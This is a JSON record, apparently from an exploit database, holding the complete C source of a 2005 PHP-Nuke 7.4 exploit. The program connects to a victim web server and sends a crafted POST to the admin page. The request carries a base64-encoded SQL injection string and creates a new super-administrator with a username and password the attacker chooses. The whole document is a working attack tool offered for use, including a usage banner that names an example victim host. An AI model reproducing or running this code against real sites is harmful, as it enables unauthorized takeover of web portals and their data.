{
  "id": "801",
  "title": "PHP-Nuke 7.4 - Admin",
  "cve": null,
  "vuln_type": "unknown",
  "code": "/* \r\n * old exploit but what pretty code /str0ke\r\n */\r\n\r\n/****************************************************\r\n*                                                   *\r\n* phpNUKE v7.4 exploit                              *\r\n*                                                   *\r\n* this exploit create new admin with relative       *\r\n* passwd that you specified on parameter of exploit *\r\n* you take administrative control of the webPortal  *\r\n*                                                   *\r\n* Reverences: http://www.osvdb.org/9563             * \r\n*                                                   *\r\n* coded by: Silentium of Anacron Group Italy        *\r\n*      date: 07/02/2005                             *\r\n*    e-mail: anacrongroupitaly[at]autistici[dot]org *\r\n*   my_home: www.autistici.org/anacron.group-italy  *\r\n*                                                   *\r\n* this tool is developed under GPL license          *\r\n* no(c) .:. copyleft                                *\r\n*                                                   *\r\n****************************************************/\r\n\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <sys/types.h>\r\n#include <sys/socket.h>\r\n#include <netinet/in.h>\r\n#include <netdb.h>\r\n\r\n#define PORT 80\t\t// port of web server \r\n\r\nvoid info(void);\r\nvoid sendxpl(FILE *out, char *argv[]);\r\nvoid errsock(void);\r\nvoid errgeth(void);\r\nvoid errconn(char *argv[]);\r\n\r\nint main(int argc, char *argv[]){\r\n\r\nFILE *out;\r\nint sock, sockconn;\r\nstruct sockaddr_in addr;\r\nstruct hostent *hp;\r\n\r\nif(argc!=5)\r\n   info();\r\n   \r\nif((sock = socket(AF_INET,SOCK_STREAM,0)) < 0)\r\n   errsock();\r\n   \r\n   system(\"clear\");\r\n   printf(\"[*] Creating socket\t\t[OK]\\n\");\r\n\r\nif((hp = gethostbyname(argv[1])) == NULL)\r\n   errgeth();\r\n   \r\n   printf(\"[*] Resolving victim host\t[OK]\\n\");\r\n   \r\nmemset(&addr,0,sizeof(addr));\r\nmemcpy((char *)&addr.sin_addr,hp->h_addr,hp->h_length);\r\naddr.sin_family = AF_INET;\r\naddr.sin_port = htons(PORT);\r\n\r\nsockconn = connect(sock,(struct sockaddr *)&addr,sizeof(addr));\r\nif(sockconn < 0)\r\n   errconn(argv);\r\n   \r\n   printf(\"[*] Connecting at victim host   [OK]\\n\");\r\n   \r\nout = fdopen(sock,\"a\");\r\nsetbuf(out,NULL);\r\n\r\nsendxpl(out,argv);\r\n\r\n   printf(\"[*] Now check your username and password\\n\" \r\n          \"    on http://%s%s\\n\\n\",argv[1],argv[2]);\r\n\r\nshutdown(sockconn,2);\r\nclose(sockconn);\r\n\r\nreturn 0;\r\n\r\n}\r\n\r\n\r\nvoid info(void){\r\n\r\nsystem(\"clear\");\r\nprintf(\"#########################################\\n\"\r\n       \"# phpNUKE v7.4 exploit                  #\\n\"\r\n       \"#########################################\\n\"\r\n       \"# this exploit create an admin with     #\\n\"\r\n       \"# the relative password, for your fun.  #\\n\"\r\n       \"# exploit coded by Silentium            #\\n\"\r\n       \"# Anacron Group Italy                   #\\n\"\r\n       \"# www.autistici.org/anacron-group-italy #\\n\"\r\n       \"#########################################\\n\\n\"\r\n       \"[Use]\\n\\n\" \r\n       \" silePNUKExpl <victim_host> <path_adminpage> <username> <password>\\n\\n\"\r\n       \"[example]\\n\\n\"\r\n       \" silePNUKExpl www.victim.com /admin.php sile silePass\\n\\n\"); \r\nexit(1);\r\n\r\n}\r\n\r\n\r\nvoid sendxpl(FILE *out, char *argv[]){\r\n\r\nint size = 145;\r\n\r\nsize+=sizeof(argv[3]);\r\nsize+=sizeof(argv[4]);\r\n    \r\n    fprintf(out,\"POST %s HTTP/1.0\\n\"\r\n                \"Connection: Keep-Alive\\n\"\r\n                \"Pragma: no-cache\\n\"\r\n                \"Cache-control: no-cache\\n\"\r\n                \"Accept: text/html, image/jpeg, image/png, text/*, image/*, */*\\n\"\r\n                \"Accept-Encoding: x-gzip, x-deflate, gzip, deflate, identity\\n\"\r\n                \"Accept-Charset: iso-8859-1, utf-8;q=0.5, *;q=0.5\\n\"\r\n                \"Accept-Language: en\\n\"\r\n                \"Host: %s\\n\"\r\n                \"Content-Type: application/x-www-form-urlencoded\\n\"\r\n                \"Content-Length: %d\\n\\n\"\r\n                \"add_aid=%s&add_name=morte&add_pwd=%s&add_email=email%%40mail.com&admin=\"\r\n                \"eCcgVU5JT04gU0VMRUNUIDEvKjox&add_radminsuper=1&op=AddAuthor&Submit=\"\r\n                \"Create+Admin\\n\\n\",argv[2],argv[1],size,argv[3],argv[4]);\r\n                 \r\n                 printf(\"[*] Sending exploit\t\t[OK]\\n\\n\");\r\n\r\n}\r\n            \r\n                 \r\nvoid errsock(void){\r\n\r\nsystem(\"clear\");\r\nprintf(\"[x] Creating socket\t[FAILED]\\n\\n\");\r\nexit(1);\r\n\r\n}\r\n\r\n\r\nvoid errgeth(void){\r\n\r\nprintf(\"[x] Resolving victim host\t[FAILED]\\n\\n\");\r\nexit(1);\r\n\r\n}\r\n\r\n\r\nvoid errconn(char *argv[]){\r\n\r\nprintf(\"[x] Connecting at victim host\t[FAILED]\\n\\n\",argv[1]);\r\nexit(1);\r\n\r\n}\r\n\r\n// milw0rm.com [2005-02-09]",
  "url": "https://www.exploit-db.com/exploits/801"
}